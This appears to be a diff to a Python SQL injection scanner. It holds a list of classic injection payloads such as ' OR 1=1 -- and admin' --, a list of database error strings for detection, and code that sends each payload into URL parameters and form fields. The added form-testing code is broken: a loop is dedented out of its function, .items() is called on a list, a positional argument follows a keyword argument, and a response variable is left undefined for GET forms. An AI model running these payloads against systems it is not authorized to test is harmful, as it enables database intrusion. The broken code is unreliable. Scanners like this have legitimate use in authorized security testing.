@@ -10,11 +10,11 @@ SQLI_PAYLOADS = [
     "' OR 1=1 --",
     "' OR 1=1 #",
     "' OR 1=1/*",
-    "\" OR \"1\"=\"1",
-    "\" OR \"1\"=\"1\" --",
-    "\" OR \"1\"=\"1\" #",
-    "\" OR 1=1 --",
-    "\" OR 1=1 #",
+    '" OR "1"="1',
+    '" OR "1"="1" --',
+    '" OR "1"="1" #',
+    '" OR 1=1 --',
+    '" OR 1=1 #',
     "or 1=1",
     "or 1=1 --",
     "or 1=1 #",
@@ -24,7 +24,7 @@ SQLI_PAYLOADS = [
     "') OR ('1'='1' --",
     "') OR ('1'='1' #",
     "') OR 1=1 --",
-    "\") OR (\"1\"=\"1",
+    '") OR ("1"="1',
     "admin' --",
     "admin' #",
     "admin'/*",
@@ -80,8 +80,9 @@ DB_ERROR_STRINGS = [
     "sqlite3.operationalerror",
     "ora-01756",
     "pg_query",
-    "warning: mysql"
+    "warning: mysql",
 ]
+
 
 def check_sqli(url, cookies=None):
     print("\n[+] Checking for SQL Injection")
@@ -90,7 +91,8 @@ def check_sqli(url, cookies=None):
 
     check_url_sqli(url, cookies)
     check_form_sqli(url, response, cookies)
-    
+
+
 def check_url_sqli(url, cookies=None):
     parsed_url = urlsplit(url)
 
@@ -99,12 +101,20 @@ def check_url_sqli(url, cookies=None):
     if not existing_params:
         print("[+] No parameters found in the URL")
         return
-    
-    for param_name in existing_params:
+
+for param_name in existing_params:
         for payload in SQLI_PAYLOADS:
             new_query = urlencode({param_name: payload})
 
-            test_url = urlunsplit((parsed_url.scheme, parsed_url.netloc, parsed_url.path, new_query, parsed_url.fragment))
+            test_url = urlunsplit(
+                (
+                    parsed_url.scheme,
+                    parsed_url.netloc,
+                    parsed_url.path,
+                    new_query,
+                    parsed_url.fragment,
+                )
+            )
 
             response = send_request(test_url, cookies=cookies)
 
@@ -114,10 +124,56 @@ def check_url_sqli(url, cookies=None):
 
             for error_string in DB_ERROR_STRINGS:
                 if error_string.lower() in response.text.lower():
-                    print(f"[!] POTENTIAL SQLI — param: '{param_name}' | payload: {payload}")
+                    print(
+                        f"[!] POTENTIAL SQLI — param: '{param_name}' | payload: {payload}"
+                    )
                     print(f"URL: {test_url}")
+
 
 def check_form_sqli(url, response, cookies=None):
     soup = BeautifulSoup(response.text, "html.parser")
 
     skip_types = {"submit", "button", "image", "reset"}
+
+    forms = soup.find_all("form")
+
+    for form in forms:
+        action = form.get("action", response.url)
+        action = urljoin(response.url, action)
+        method = form.get("method", "GET").upper()
+
+        input_dict = {}
+        injectable_feilds = []
+
+        inputs = form.find_all("input")
+
+        for input_tag in inputs:
+            input_name = input_tag.get("name")
+            input_value = input_tag.get("value", "")
+            input_type = input_tag.get("type", "text")
+
+            if input_name:
+                input_dict[input_name] = input_value
+
+            if input_type not in skip_types and input_type != "hidden":
+                injectable_feilds.append(input_name)
+
+        if not injectable_feilds:
+            continue
+
+        for field_name in injectable_feilds:
+            for payload_name, payload in SQLI_PAYLOADS.items():
+                test_data = input_dict.copy()
+                test_data[field_name] = payload
+
+                if method == "POST":
+                    form_response = send_request(action, method=method, test_data, cookies=cookies)
+
+                if form_response is None:
+                    continue
+
+                for error_string in DB_ERROR_STRINGS:
+                    if error_string.lower() in form_response.text.lower():
+                        print(
+                        f"[!] POTENTIAL SQL — form: '{action}' | field: '{field_name}' | payload: {payload_name}"
+                    )
